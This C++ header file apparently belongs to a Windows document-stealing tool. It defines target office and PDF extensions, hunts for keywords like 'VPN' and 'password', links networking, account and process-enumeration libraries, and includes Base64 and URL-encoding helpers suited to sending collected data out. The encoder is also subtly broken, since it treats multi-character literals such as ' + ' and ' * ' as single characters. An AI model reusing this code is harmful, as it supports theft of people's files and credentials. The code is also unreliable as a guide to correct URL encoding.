#pragma once

#include<Windows.h>
#include<iostream>
#include<shlwapi.h>
#include<vector>
#include<string>
#include<lmaccess.h>
#include <iphlpapi.h>
#include<tlhelp32.h>

#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Netapi32.lib")
#pragma comment(lib, "iphlpapi.lib")
using namespace std;
#define CODE "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
#define EZ    63

wchar_t type[30][10] = {
	L"doc",
	L"docx",
	L"ppt",
	L"pptx",
	L"xls",
	L"xlsx",
	L"pdf"
};

wchar_t wKeyword[50][50]{
	L"VPN",
	L"vpn",
	L"password",
	L"PASSWORD",
};

const wchar_t* hexenc[] = {
	L"%00", L"%01", L"%02", L"%03", L"%04", L"%05", L"%06", L"%07",
	L"%08", L"%09", L"%0a", L"%0b", L"%0c", L"%0d", L"%0e", L"%0f",
	L"%10", L"%11", L"%12", L"%13", L"%14", L"%15", L"%16", L"%17",
	L"%18", L"%19", L"%1a", L"%1b", L"%1c", L"%1d", L"%1e", L"%1f",
	L"%20", L"%21", L"%22", L"%23", L"%24", L"%25", L"%26", L"%27",
	L"%28", L"%29", L"%2a", L"%2b", L"%2c", L"%2d", L"%2e", L"%2f",
	L"%30", L"%31", L"%32", L"%33", L"%34", L"%35", L"%36", L"%37",
	L"%38", L"%39", L"%3a", L"%3b", L"%3c", L"%3d", L"%3e", L"%3f",
	L"%40", L"%41", L"%42", L"%43", L"%44", L"%45", L"%46", L"%47",
	L"%48", L"%49", L"%4a", L"%4b", L"%4c", L"%4d", L"%4e", L"%4f",
	L"%50", L"%51", L"%52", L"%53", L"%54", L"%55", L"%56", L"%57",
	L"%58", L"%59", L"%5a", L"%5b", L"%5c", L"%5d", L"%5e", L"%5f",
	L"%60", L"%61", L"%62", L"%63", L"%64", L"%65", L"%66", L"%67",
	L"%68", L"%69", L"%6a", L"%6b", L"%6c", L"%6d", L"%6e", L"%6f",
	L"%70", L"%71", L"%72", L"%73", L"%74", L"%75", L"%76", L"%77",
	L"%78", L"%79", L"%7a", L"%7b", L"%7c", L"%7d", L"%7e", L"%7f",
	L"%80", L"%81", L"%82", L"%83", L"%84", L"%85", L"%86", L"%87",
	L"%88", L"%89", L"%8a", L"%8b", L"%8c", L"%8d", L"%8e", L"%8f",
	L"%90", L"%91", L"%92", L"%93", L"%94", L"%95", L"%96", L"%97",
	L"%98", L"%99", L"%9a", L"%9b", L"%9c", L"%9d", L"%9e", L"%9f",
	L"%a0", L"%a1", L"%a2", L"%a3", L"%a4", L"%a5", L"%a6", L"%a7",
	L"%a8", L"%a9", L"%aa", L"%ab", L"%ac", L"%ad", L"%ae", L"%af",
	L"%b0", L"%b1", L"%b2", L"%b3", L"%b4", L"%b5", L"%b6", L"%b7",
	L"%b8", L"%b9", L"%ba", L"%bb", L"%bc", L"%bd", L"%be", L"%bf",
	L"%c0", L"%c1", L"%c2", L"%c3", L"%c4", L"%c5", L"%c6", L"%c7",
	L"%c8", L"%c9", L"%ca", L"%cb", L"%cc", L"%cd", L"%ce", L"%cf",
	L"%d0", L"%d1", L"%d2", L"%d3", L"%d4", L"%d5", L"%d6", L"%d7",
	L"%d8", L"%d9", L"%da", L"%db", L"%dc", L"%dd", L"%de", L"%df",
	L"%e0", L"%e1", L"%e2", L"%e3", L"%e4", L"%e5", L"%e6", L"%e7",
	L"%e8", L"%e9", L"%ea", L"%eb", L"%ec", L"%ed", L"%ee", L"%ef",
	L"%f0", L"%f1", L"%f2", L"%f3", L"%f4", L"%f5", L"%f6", L"%f7",
	L"%f8", L"%f9", L"%fa", L"%fb", L"%fc", L"%fd", L"%fe", L"%ff"
};

std::wstring UrlEncode(wchar_t* text)
{
	size_t len = wcslen(text);
	std::wstring encoded = L"";
	for (size_t i = 0; i < len; i++)
	{
		wchar_t wch = text[i];
		if ('A' <= wch && wch <= 'Z') {
			encoded += wch;
		}
		else if ('a' <= wch && wch <= 'z') {
			encoded += wch;
		}
		else if ('0' <= wch && wch <= '9') {
			encoded += wch;
		}
		else if (wch == ' ') {
			encoded += L' + ';
		}
		else if (wch == '('
			|| wch == ')') {
			encoded += wch;
		}
		else if (wch == ' - ' || wch == '_'
			|| wch == '.' || wch == '!'
			|| wch == '~' || wch == ' * '
			|| wch == '\'') {
			encoded += hexenc[wch];
		}
		else if (wch <= 0x007f) {        // other ASCII
			encoded += hexenc[wch];
		}
		else if (wch <= 0x07FF) {        // non-ASCII <= 0x7FF
			encoded += hexenc[0xc0 | (wch >> 6)];
			encoded += hexenc[0x80 | (wch & 0x3F)];
		}
		else {                    // 0x7FF < ch <= 0xFFFF
			encoded += hexenc[0xe0 | (wch >> 12)];
			encoded += hexenc[0x80 | ((wch >> 6) & 0x3F)];
			encoded += hexenc[0x80 | (wch & 0x3F)];
		}
	}
	return encoded.c_str();//ref new String(encoded.c_str());    
}
